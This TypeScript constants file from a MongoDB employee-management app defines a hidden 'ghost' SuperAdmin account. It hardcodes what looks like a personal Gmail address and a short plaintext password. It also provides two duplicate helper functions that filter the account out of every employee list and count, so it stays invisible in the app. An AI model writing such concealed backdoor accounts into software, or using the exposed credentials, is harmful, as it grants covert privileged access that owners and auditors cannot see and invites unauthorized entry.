/**
 * Employee-related constants
 * These constants define special employee accounts that should be excluded from public views
 */

// Ghost SuperAdmin account - should not appear in any employee lists or counts
// This account exists only in the database and has full SuperAdmin access
export const GHOST_SUPERADMIN_EMAIL = "aniabh@gmail.com";
export const GHOST_SUPERADMIN_PASSWORD = "125412";

/**
 * Helper function to exclude ghost email from employee queries
 * @param query - The existing MongoDB query object
 * @returns Query object with ghost email excluded
 */
export function excludeGhostEmail(query: any = {}): any {
  // If email field exists and is not already a $ne operator, use $and to combine
  if (query.email && (query.email instanceof RegExp || (typeof query.email === 'object' && !query.email.$ne))) {
    const existingAnd = query.$and || [];
    const { email, ...restQuery } = query;
    return {
      ...restQuery,
      $and: [
        ...existingAnd,
        { email },
        { email: { $ne: GHOST_SUPERADMIN_EMAIL } }
      ],
    };
  }
  // If email doesn't exist, just add $ne
  if (!query.email) {
    return {
      ...query,
      email: { $ne: GHOST_SUPERADMIN_EMAIL },
    };
  }
  // If email already has $ne, merge it (though this shouldn't happen in practice)
  if (query.email && typeof query.email === 'object' && query.email.$ne) {
    return {
      ...query,
      email: { ...query.email, $ne: GHOST_SUPERADMIN_EMAIL },
    };
  }
  // Default: add $ne to exclude ghost email
  return {
    ...query,
    email: { $ne: GHOST_SUPERADMIN_EMAIL },
  };
}

/**
 * Helper function to exclude ghost email from count queries
 * @param query - The existing MongoDB query object
 * @returns Query object with ghost email excluded
 */
export function excludeGhostEmailFromCount(query: any = {}): any {
  // If email field exists and is not already a $ne operator, use $and to combine
  if (query.email && (query.email instanceof RegExp || (typeof query.email === 'object' && !query.email.$ne))) {
    const existingAnd = query.$and || [];
    const { email, ...restQuery } = query;
    return {
      ...restQuery,
      $and: [
        ...existingAnd,
        { email },
        { email: { $ne: GHOST_SUPERADMIN_EMAIL } }
      ],
    };
  }
  // If email doesn't exist, just add $ne
  if (!query.email) {
    return {
      ...query,
      email: { $ne: GHOST_SUPERADMIN_EMAIL },
    };
  }
  // If email already has $ne, merge it (though this shouldn't happen in practice)
  if (query.email && typeof query.email === 'object' && query.email.$ne) {
    return {
      ...query,
      email: { ...query.email, $ne: GHOST_SUPERADMIN_EMAIL },
    };
  }
  // Default: add $ne to exclude ghost email
  return {
    ...query,
    email: { $ne: GHOST_SUPERADMIN_EMAIL },
  };
}
